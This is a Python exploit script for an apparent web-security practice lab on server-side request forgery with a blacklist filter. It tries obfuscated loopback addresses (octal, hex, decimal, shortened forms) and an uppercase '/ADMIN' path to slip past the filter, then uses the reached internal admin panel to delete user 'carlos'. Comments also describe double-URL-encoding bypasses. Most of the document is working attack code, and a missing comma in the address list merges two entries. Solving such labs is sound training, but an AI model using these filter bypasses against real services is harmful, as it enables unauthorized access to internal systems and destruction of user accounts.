import requests as r 

from time import sleep 


# Lab: SSRF with blacklist-based input filter

# first bypass : found the correct ip : 127.1
# second bypass : found the bypass form admin  => /ADMIN 
#  or  double url encode "admin" ex: "a" => %2561 ...


link = "" # /product/stock endpoint
test_ip = [
"127.0.0.1",
"0177.0.0.1",
"0x7f.0.0.1"
"127.0.1",
"127.1",
"2130706433",
"017700000001",
"0x7f000001",
"localhost"
]

def test_addr(l):
    found_bypass = ""
    for i in test_ip:
        test_endpoint = "http://"+i + "/ADMIN"
        myreq = r.post(link , data={"stockApi":test_endpoint})
        response = myreq.text 
        print("[+] testing :", test_endpoint , " status: ", myreq.status_code)

        if 'admin' in response.lower():
            found_bypass = test_endpoint
            print("Found bypass : ", found_bypass)
            myreq.close()
            return found_bypass
        sleep(0.4)
        myreq.close()


def delete_carlos(l, endpoint):
    myreq = r.post(link , data={"stockApi":endpoint+"/delete?username=carlos"})
    response = myreq.text 
    print(response)
    myreq.close()

if __name__ == "__main__":
    ep = test_addr(link)
    delete_carlos(link, ep)